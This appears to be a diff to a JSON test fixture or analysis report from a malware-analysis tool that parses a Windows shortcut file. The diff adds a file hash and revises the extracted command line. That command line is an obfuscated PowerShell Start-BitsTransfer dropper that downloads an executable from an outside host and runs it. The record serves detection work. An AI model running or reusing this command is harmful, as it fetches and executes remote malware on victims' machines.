@@ -1,6 +1,8 @@
 {
     "response": {
-        "supplementary": [],
+        "supplementary": [
+            "cd6290f9ddc608b4f35b9300f6abba1c1ddca36841daf62c9b4bc3f57a1c71ca"
+        ],
         "extracted": []
     },
     "result": {
@@ -16,7 +18,7 @@
                 "C:\\Windows\\System32\\shell32.dll"
             ],
             "file.shortcut.command_line": [
-                "Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\Users\\Public\\o5impa.e`xe;C:\\Users\\Public\\o5impa.e`xe"
+                "powershell.exe Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\Users\\Public\\o5impa.e`xe;C:\\Users\\Public\\o5impa.e`xe"
             ]
         }
     }
